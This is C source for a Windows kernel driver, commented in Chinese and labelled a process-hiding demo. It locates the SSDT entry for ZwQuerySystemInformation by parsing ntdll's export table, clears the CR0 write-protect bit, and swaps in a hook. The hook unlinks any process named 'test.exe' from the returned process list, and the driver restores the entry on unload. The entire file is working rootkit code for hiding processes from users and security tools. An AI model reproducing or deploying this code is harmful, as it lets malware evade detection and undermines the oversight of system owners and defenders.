/**
 * 展示部分
 * 隐藏进程demo，
 * 通过hook SSDT方式实现
 * 对ZwQuerySystemInformation()系统调用进行hook
 */

#include <ntddk.h>
#include <windef.h>
#include <ntimage.h>

//存放原函数地址
PVOID oldZwQuerySystemInformation;

//存放原函数索引
ULONG ulSSDTFunctionIndex = 0;


//SSDT
DWORD *SSDTcallTable;


typedef enum _SYSTEM_INFORMATION_CLASS {

	SystemProcessInformation = 5,
	SystemProcessorPerformanceInformation = 8
}SYSTEM_INFORMATION_CLASS;


typedef NTSTATUS (*ZwQuerySystemInformationPtr)(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	IN PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength
	);

//ZwQuerySystemInformation()需要的两个结构体参数定义
typedef struct _SYSTEM_PROCESS_INFO {
	ULONG NextEntryOffset;   //下一个结构体的偏移
	ULONG NumberOfThreads;   //进程的线程数
	
	ULONG  Reserved[6];
	LARGE_INTEGER CreatedTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ProcessName;
	KPRIORITY BasePriority;
	HANDLE UniqueProceessId;
	PVOID Reserved3;
	ULONG HandleCount;
	BYTE  Reserved4[4];
	PVOID Reserved5[11];
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER Reserved6[6];
}SYSTEM_PROCESS_INFO,*PSYSTEM_PROCESS_INFO;

typedef struct _SYSTEM_PROCESSOR_PERFORMANCE_INFO {
	LARGE_INTEGER IdleTime;
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER Reserved1[2];
	ULONG Reserved2;
}SYSTEM_PROCESSOR_PERFORMANCE_INFO,*PSYSTEM_PROCESSOR_PERFORMANCE_INFO;

//判断是否该隐藏此进程  1表示需要隐藏  0 表示不需要隐藏
//可添加隐藏进程
int shouldHide(PSYSTEM_PROCESS_INFO systeminfo) {
	//通过名称进行判断
	if (NULL != wcsstr((*systeminfo).ProcessName.Buffer, L"test.exe"))
		return 1;
	return 0;
}

//替换函数
NTSTATUS newZwQuerySystemInformation(
	IN ULONG SystemInformationClass,
	IN PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength) 
{
	NTSTATUS ntStatus;
	PSYSTEM_PROCESS_INFO cSPI;//当前进程信息
	PSYSTEM_PROCESS_INFO pSPI;//上一个结构体

	ntStatus = ((ZwQuerySystemInformationPtr)(oldZwQuerySystemInformation))(
		SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength);

	if (!NT_SUCCESS(ntStatus)) {
		return(ntStatus);
	}
	if (SystemInformationClass != SystemProcessInformation) {
		return ntStatus;
	}
	cSPI = (PSYSTEM_PROCESS_INFO)SystemInformation;
	pSPI = NULL;
	while (cSPI != NULL) {
		if ((*cSPI).ProcessName.Buffer != NULL) {
			//DbgPrint("ProcName:  %-20ws     pid:  %u\n", (*cSPI).ProcessName.Buffer, (*cSPI).UniqueProceessId);
			//判断是否为需要隐藏的进程名
			if (shouldHide(cSPI)) {
				//DbgPrint("hide %-20ws\n", (*cSPI).ProcessName.Buffer);
				//当前的进程不是第一个  第一个进程时pSPI是NULL
				if (pSPI != NULL) {
					//当前进程是最后一个
					if ((*cSPI).NextEntryOffset == 0) {
						//把他的前一个的后向指针置零  脱链
						(*pSPI).NextEntryOffset = 0;
					}
					else {
						//前一个的后向指针偏移修正
						(*pSPI).NextEntryOffset = (*pSPI).NextEntryOffset + (*cSPI).NextEntryOffset;
					}
				}
				else {//是第一个进程
					if ((*cSPI).NextEntryOffset == 0) {//只有一个进程
						SystemInformation = NULL;
					}
					else {//第一个进程但不是最后一个进程,将SystemInformation修正
						(BYTE*)SystemInformation = ((BYTE*)SystemInformation) + (*cSPI).NextEntryOffset;
					}
				}
			}

		}
		//继续处理遍历下一个进程信息
		pSPI = cSPI;
		if ((*cSPI).NextEntryOffset != 0) {
			(BYTE*)cSPI = ((BYTE*)cSPI) + (*cSPI).NextEntryOffset;
		}
		else {
			cSPI = NULL;
		}
	}
	return ntStatus;
}


//几个关键数据结构的定义
#pragma pack(1)
typedef struct  ServiceDescriptorEntry {
	DWORD *KiServiceTable;
	DWORD* CounterBaseTable;
	DWORD nSystemCalls;
	DWORD* KiArgumentTable;
}SDE,*PSDE;
#pragma pack()

typedef struct ServiceDescriptorTable {
	SDE ServiceDescriptor[4];
}SDT;

//通过更改cr0寄存器的WP位来开启或者关闭写保护
VOID disableWP_cr0() {
	//0xfffeffff  -> 11111111 11111110 11111111 11111111
	__asm {
		PUSH EBX
		MOV EBX,cr0
		AND EBX,0xfffeffff
		MOV CR0,EBX
		POP EBX
	}
	DbgPrintEx(DPFLTR_IHVVIDEO_ID, DPFLTR_WARNING_LEVEL, "disable write protection\n");
	return;
}

VOID enableWP_cr0() {
	__asm {
		PUSH EBX
		MOV EBX, cr0
		OR EBX,0x00010000
		MOV CR0, EBX
		POP EBX
	}
	DbgPrintEx(DPFLTR_IHVVIDEO_ID, DPFLTR_WARNING_LEVEL, "enable write protection\n");
	return;
}



// 内存映射此dll文件
NTSTATUS DllFileMap(UNICODE_STRING ustrDllFileName, HANDLE* phFile, HANDLE* phSection, PVOID* ppBaseAddress)
{
	NTSTATUS status = STATUS_SUCCESS;
	HANDLE hFile = NULL;
	HANDLE hSection = NULL;
	OBJECT_ATTRIBUTES objectAttributes = { 0 };
	IO_STATUS_BLOCK iosb = { 0 };
	PVOID pBaseAddress = NULL;
	SIZE_T viewSize = 0;
	// 打开 DLL 文件, 并获取文件句柄
	InitializeObjectAttributes(&objectAttributes, &ustrDllFileName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	status = ZwOpenFile(&hFile, GENERIC_READ, &objectAttributes, &iosb,
		FILE_SHARE_READ, FILE_SYNCHRONOUS_IO_NONALERT);
	if (!NT_SUCCESS(status))
	{
		KdPrint(("ZwOpenFile Error! [error code: 0x%X]", status));
		return status;
	}
	// 创建一个节对象, 以 PE 结构中的 SectionALignment 大小对齐映射文件
	status = ZwCreateSection(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE, NULL, 0, PAGE_READWRITE, 0x1000000, hFile);
	if (!NT_SUCCESS(status))
	{
		ZwClose(hFile);
		KdPrint(("ZwCreateSection Error! [error code: 0x%X]", status));
		return status;
	}
	// 映射到内存
	status = ZwMapViewOfSection(hSection, NtCurrentProcess(), &pBaseAddress, 0, 1024, 0, &viewSize, ViewShare, MEM_TOP_DOWN, PAGE_READWRITE);
	if (!NT_SUCCESS(status))
	{
		ZwClose(hSection);
		ZwClose(hFile);
		KdPrint(("ZwMapViewOfSection Error! [error code: 0x%X]", status));
		return status;
	}

	// 返回数据
	*phFile = hFile;
	*phSection = hSection;
	*ppBaseAddress = pBaseAddress;

	return status;
}

//从导出表获取索引
// 根据导出表获取导出函数地址, 从而获取 SSDT 函数索引号
ULONG GetIndexFromExportTable(PVOID pBaseAddress, PCHAR pszFunctionName)
{
	ULONG ulFunctionIndex = 0;
	// Dos Header
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBaseAddress;
	// NT Header
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((PUCHAR)pDosHeader + pDosHeader->e_lfanew);
	// Export Table
	PIMAGE_EXPORT_DIRECTORY pExportTable = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)pDosHeader + pNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	// 有名称的导出函数个数
	ULONG ulNumberOfNames = pExportTable->NumberOfNames;
	// 导出函数名称地址表
	PULONG lpNameArray = (PULONG)((PUCHAR)pDosHeader + pExportTable->AddressOfNames);
	PCHAR lpName = NULL;
	// 开始遍历导出表
	for (ULONG i = 0; i < ulNumberOfNames; i++)
	{
		lpName = (PCHAR)((PUCHAR)pDosHeader + lpNameArray[i]);
		// 判断是否是要查询的函数
		if (0 == _strnicmp(pszFunctionName, lpName, strlen(pszFunctionName)))
		{
			// 获取导出函数地址
			USHORT uHint = *(USHORT*)((PUCHAR)pDosHeader + pExportTable->AddressOfNameOrdinals + 2 * i);
			ULONG ulFuncAddr = *(PULONG)((PUCHAR)pDosHeader + pExportTable->AddressOfFunctions + 4 * uHint);
			PVOID lpFuncAddr = (PVOID)((PUCHAR)pDosHeader + ulFuncAddr);
			// 获取目标函数的Index
			ulFunctionIndex = *(ULONG*)((PUCHAR)lpFuncAddr + 1);
			break;
		}
	}

	return ulFunctionIndex;
}

// 从 ntdll.dll 中获取 SSDT 函数索引号
ULONG GetSSDTFunctionIndex(UNICODE_STRING ustrDllFileName, PCHAR pszFunctionName)
{
	ULONG ulFunctionIndex = 0;
	NTSTATUS status = STATUS_SUCCESS;
	HANDLE hFile = NULL;
	HANDLE hSection = NULL;
	PVOID pBaseAddress = NULL;

	// 进行内存映射
	status = DllFileMap(ustrDllFileName, &hFile, &hSection, &pBaseAddress);
	if (!NT_SUCCESS(status))
	{
		KdPrint(("DllFileMap Error!\n"));
		return ulFunctionIndex;
	}

	// 根据导出表获取 SSDT 函数索引号
	ulFunctionIndex = GetIndexFromExportTable(pBaseAddress, pszFunctionName);

	// free
	ZwUnmapViewOfSection(NtCurrentProcess(), pBaseAddress);
	ZwClose(hSection);
	ZwClose(hFile);

	return ulFunctionIndex;
}


//  hook SSDT项
BYTE* hookSSDT(ULONG index,BYTE* newAddr,DWORD *callTable) {
	PLONG target;
	target = (PLONG) & (callTable[index]);
	return ((BYTE*)InterlockedExchange(target, (LONG)newAddr));
}

//和hook基本差不多
VOID unhookSSDT(ULONG index,BYTE* oldAddr,DWORD* callTable) {
	PLONG target;
	target = (PLONG) & (callTable[index]);
	InterlockedExchange(target, (LONG)oldAddr);
}



VOID Unload(IN PDRIVER_OBJECT DriverObject) {
	//KdBreakPoint();
	DbgPrintEx(DPFLTR_IHVVIDEO_ID, DPFLTR_WARNING_LEVEL, "Driver unLoading.\n");
	disableWP_cr0();
	unhookSSDT(ulSSDTFunctionIndex, oldZwQuerySystemInformation, SSDTcallTable);
	enableWP_cr0();
	return;
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING regPath) {

	DbgPrintEx(DPFLTR_IHVVIDEO_ID, DPFLTR_WARNING_LEVEL, "Driver running.\n");
	(*DriverObject).DriverUnload = Unload;
	//KdBreakPoint();

	//导入KeServiceDescriptorTable  获取ssdt地址
	__declspec(dllimport) SDE KeServiceDescriptorTable;
	SSDTcallTable = KeServiceDescriptorTable.KiServiceTable;

	//获取函数对应的索引
	UNICODE_STRING ustrDllFileName;
	RtlInitUnicodeString(&ustrDllFileName, L"\\??\\C:\\Windows\\System32\\ntdll.dll");
	ulSSDTFunctionIndex = GetSSDTFunctionIndex(ustrDllFileName, "ZwQuerySystemInformation");

	//获取函数地址
	oldZwQuerySystemInformation = SSDTcallTable[ulSSDTFunctionIndex];

	if (NULL == oldZwQuerySystemInformation)
	{
		DbgPrint("Get SSDT Function address Error!\n");
		return STATUS_SUCCESS;
	}

	disableWP_cr0();
	//oldZwQuerySystemInformation = hookSSDT(ulSSDTFunctionIndex, newZwQuerySystemInformation, SSDTcallTable);
	hookSSDT(ulSSDTFunctionIndex, newZwQuerySystemInformation, SSDTcallTable);
	enableWP_cr0();

	return(STATUS_SUCCESS);
}
